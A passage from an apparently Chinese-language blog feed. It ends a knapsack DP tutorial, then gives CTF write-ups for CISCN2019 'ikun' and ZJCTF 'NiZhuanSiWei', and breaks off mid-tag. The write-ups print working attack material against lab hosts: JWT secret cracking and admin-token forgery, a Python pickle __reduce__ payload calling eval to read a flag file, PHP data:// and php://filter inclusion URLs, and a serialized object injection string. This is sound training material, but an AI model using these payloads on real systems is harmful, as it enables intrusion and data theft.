punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p>01背包就先记录这两题，有时间再补充</p><h2 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h2><p>再来看完全背包问题<br>完全背包和01背包的基本是一样的，区别在于完全背包的物品可以重复装入，也就是每个物品有无限个，依然求怎么装物品能使权重最大</p><h3 id="例题1-1"><a href="#例题1-1" class="headerlink" title="例题1"></a>例题1</h3><p>上题<br><img src="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/1.jpg" alt=""><br>典型的完全背包，背包容量换成了时间，物品就是药品。<br>还是先确定dp数组的含义，不过这题不能用二维数组了，i和j都可以达到10000，时间会爆的，所以只能用一维数组<br>那么dp[i]的定义就为当时间剩余i时，且第i种药还没有采时(第i种药可以无限次采摘)所采的药的最大价值</p><p>第二步求递推公式<br>对第i种草药我们有采和不采两种选择，如果选择采的话，那么<code>dp[i]=dp[i-a[i]]+v[i]</code><br>不采的话<code>dp[i]=dp[i]</code>，综合两种情况来看，<code>dp[i]=max(dp[i-a[i]]+v[i],dp[i])</code></p><p>在前面的01背包中，我们是从后往前遍历物品的价值，但完全背包不一样，完全背包要累计同一个物品的价值多次，完全背包的前一个状态可能依然是累加完同一个物品后的状态<br>从前往后更新，我们选择的是根据当前的状态值来更新本次的结果，从后往前更新，我们选择的是根据上一次的状态值来更新本次的结果<br>01背包是根据上一次的状态值来更新的，dp[i]与dp[i-1]有关<br>完全背包的二维数组为:<code>f[i][j] = max(f[i-1][j], f[i][j - weight[i]] + value[i])</code><br>由于一个物品可以被选择多次，更新f[i][j]时，f[i][j- weight[i]]可能因为放入物品i而发生变化。</p><p>整体代码如下</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstdio></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> T<span class="token punctuation">,</span>M<span class="token punctuation">,</span>t<span class="token punctuation">[</span><span class="token number">100001</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">100001</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">100000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    cin<span class="token operator">>></span>T<span class="token operator">>></span>M<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>M<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin<span class="token operator">>></span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>M<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>T<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>j<span class="token operator">-</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>T<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//要从所有值中找出最大值</span>    <span class="token punctuation">{</span>        ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>今天就先记录这么多，以后有时间在记录</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态规划 </tag>
            
            <tag> C </tag>
            
            <tag> 背包问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN2019 华北赛区 Day1 Web2]ikun</title>
      <link href="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/"/>
      <url>/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/</url>
      
        <content type="html"><![CDATA[<p>打开环境，喜闻乐见<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/1.jpg" alt=""></p><a id="more"></a><p>先注册一个账号<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/3.jpg" alt=""><br>然后找一找信息<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/2.jpg" alt=""><br>要找到lv6<br>往下翻了几页，好想挺多页的样子，手工找不出来，写个脚本吧</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://63d2c3fa-95be-449a-afe2-1e07c97c0013.node3.buuoj.cn/shop?page=%d"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u <span class="token operator">=</span> url <span class="token operator">%</span> i    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在测试第%d页"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"lv6在第%d页"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/4.jpg" alt=""><br>找到lv6在181页<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/5.jpg" alt=""><br>购买<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/6.jpg" alt=""><br>好像买不起的样子<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/7.jpg" alt=""><br>果然买不起<br>那开着burp看看请求<br>注意到有一个discount折扣字样<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/8.jpg" alt=""><br>那把折扣改成0试一下<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/9.jpg" alt=""><br>操作失败<br>那把折扣改为不为0的很小的数字试试<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/10.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/11.jpg" alt=""><br>购买成功到了另一个页面，显示只允许admin访问<br>可能和cookie之类的有关，再次访问抓包<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/12.jpg" alt=""><br>注意到有一个JWT字段</p><pre class=" language-bash"><code class="language-bash">Json web token <span class="token punctuation">(</span>JWT<span class="token punctuation">)</span>, 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<span class="token punctuation">(</span>RFC 7519<span class="token punctuation">)</span>.该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密</code></pre><p>一种token，用来认证的</p><pre class=" language-bash"><code class="language-bash">JWT的构成第一部分我们称它为头部（header<span class="token punctuation">)</span>,第二部分我们称其为载荷（payload, 类似于飞机上承载的物品<span class="token punctuation">)</span>，第三部分是签证（signature<span class="token punctuation">)</span>.</code></pre><p>整体就差不多是这样<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/13.jpg" alt=""><br>不过JWT可以破解，python中的pyjwt模块等，在这里我们用<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>这个工具破解<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/14.jpg" alt=""><br>破解很快，加密密钥就是1Kun<br>然后我们到这个网站去进行在线加密<a href="https://jwt.io/" target="_blank" rel="noopener"></a><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/15.jpg" alt=""><br>把密钥替换为1Kun，用户名替换为admin，将新的JWT替换到我们的请求信息当中<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/16.jpg" alt=""><br>成功以admin身份登录<br>查看页面源代码<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/17.jpg" alt=""><br>发现了一个压缩文件，下载来看看<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/18.jpg" alt=""><br>是这个网站的源代码<br>又到了头疼的代码审计环节。。。<br>挨个挨个看吧</p><hr><p>好吧实在审不来，看wp吧<br>有一个python反序列化漏洞，在Admin.py </p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web<span class="token keyword">from</span> sshop<span class="token punctuation">.</span>base <span class="token keyword">import</span> BaseHandler<span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">AdminHandler</span><span class="token punctuation">(</span>BaseHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    @tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>current_user <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'no_ass.html'</span><span class="token punctuation">)</span>    @tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>漏洞代码出现在这里</p><pre class=" language-python"><code class="language-python">become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>关于python反序列化漏洞可以看看这篇文章<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你理解漏洞之 Python 反序列化漏洞</a></p><pre class=" language-bash"><code class="language-bash">当序列化以及反序列化的过程中中碰到一无所知的扩展类型<span class="token punctuation">(</span>这里指的就是新式类<span class="token punctuation">)</span>的时候，可以通过类中定义的__reduce__方法来告知如何进行序列化或者反序列化也就是说我们，只要在新式类中定义一个 __reduce__ 方法，我们就能在序列化的使用让这个类根据我们在__reduce__ 中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object<span class="token punctuation">(</span>可调用的对象<span class="token punctuation">)</span>，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的 PVM 的指令码，你就会发现这个返回值和其中的一个 R 指令非常的一致，（我猜测这个 R 指令码就是这个 __reduce__ 方法的返回值的底层实现 ）</code></pre><pre class=" language-bash"><code class="language-bash">urllib.unquote<span class="token punctuation">(</span><span class="token punctuation">)</span>字符串被当作url提交时会被自动进行url编码处理pickle.dump<span class="token punctuation">(</span>obj, file<span class="token punctuation">[</span>, protocol<span class="token punctuation">]</span><span class="token punctuation">)</span>序列化对象，并将结果数据流写入到文件对象中。参数protocol是序列化模式，默认值为0，表示以文本的形式序列化。protocol的值还可以是1或2，表示以二进制的形式序列化。pickle.load<span class="token punctuation">(</span>file<span class="token punctuation">)</span>反序列化对象。将文件中的数据解析为一个Python对象。</code></pre><p>exp如下(要在python2下运行)</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span> a</code></pre><p>再将a传给become即可<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/19.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/20.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python反序列化 </tag>
            
            <tag> pickle，Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ZJCTF 2019]NiZhuanSiWei</title>
      <link href="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/"/>
      <url>/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/</url>
      
        <content type="html"><![CDATA[<p>打开环境，直接给出了源代码</p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>审计源代码<br>可以传入text,file和password参数，file参数需要我们传入一个文件，且文件内容为”welcome to the zjctf”<br>用file_get_contents读取file参数<br><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/#data" target="_blank" rel="noopener">文件包含漏洞与php伪协议</a><br>我们可以用data://伪协议将内容写然后再让file_get_contents读取<br>payload:</p><pre class=" language-bash"><code class="language-bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/1.jpg" alt=""><br>往后看<br>file会被include，但flag被过滤了，所以我们不能直接包含flag.php<br>但给了提示有useless.php,那我们就包含useless.php<br>可以用php://filter伪协议读取useless.php的源代码<br>payload:</p><pre class=" language-bash"><code class="language-bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>php://filter/convert.base64-encode/resource<span class="token operator">=</span>useless.php</code></pre><p><img src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/2.jpg" alt=""><br>将得到的base64字符串解码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>"U R <span class="token constant">SO</span> <span class="token constant">CLOSE</span> <span class="token operator">!</span><span class="token comment" spellcheck="true">///COME ON PLZ");</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token delimiter">?></span>  </code></pre><p>审计代码<br>定义了Flag类，有一个file属性<br>__tostring()魔术方法会读取file的内容</p><p>再看到之前的代码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span></code></pre><p>输出反序列化之后的password参数<br>据此，我们可以将Flag类的file属性设置为flag.php，然后传入password参数即可</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$a"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</span><span class="token delimiter">?></span></code></pre><p>payload:</p><pre class=" language-bash"><code class="language-bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>useless.php<span class="token operator">&amp;</span>password<span class="token operator">=</span>O:4:<span class="token string">"Flag"</span>:1:<span class="token punctuation">{</span>s:4:<span class="token string">"file"</span><span class="token punctuation">;</span>s:8:<span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img 